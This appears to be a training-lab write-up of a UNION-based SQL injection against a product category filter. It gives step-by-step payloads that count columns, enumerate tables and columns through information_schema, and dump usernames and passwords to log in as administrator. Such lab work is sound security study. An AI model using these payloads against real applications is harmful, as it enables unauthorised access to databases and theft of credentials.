This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

> Using the payload 'UNION+SELECT+NULL,NULL-- we were able to determine there are two columns

![image](https://github.com/udayk01/Web-Security/assets/52235763/33d4a997-721d-493f-a246-222ec4a18ab8)

> Now we listed the tables in the database using the query '+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--

![image](https://github.com/udayk01/Web-Security/assets/52235763/c3970970-2a04-4995-bf90-0b7295aad89c)

> users_qczzvu is the required table

![image](https://github.com/udayk01/Web-Security/assets/52235763/5a43dc48-606a-4b63-91ee-5565b97fac9f)

> The payload '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_qczzvu'-- was used to list the columns in the table users_qczzvu

![image](https://github.com/udayk01/Web-Security/assets/52235763/18ac976a-04c2-40e2-bffc-a559b8b2da25)

> The payload '+UNION+SELECT+username_ipifwd,+password_rsyuvu+FROM+users_qczzvu-- is used to list the users and their passwords in the table.

![image](https://github.com/udayk01/Web-Security/assets/52235763/9da0a15f-608b-4ea7-bce9-552e113bb53f)

![image](https://github.com/udayk01/Web-Security/assets/52235763/5f46d7aa-cbfd-4707-8d8c-09c9db100ec5)

> Finally logged in as administrator.

![image](https://github.com/udayk01/Web-Security/assets/52235763/b5226b33-7469-42fa-afc2-665b3d23640e)

![image](https://github.com/udayk01/Web-Security/assets/52235763/ad77930a-70a8-493a-a1b1-36285cbd3435)





























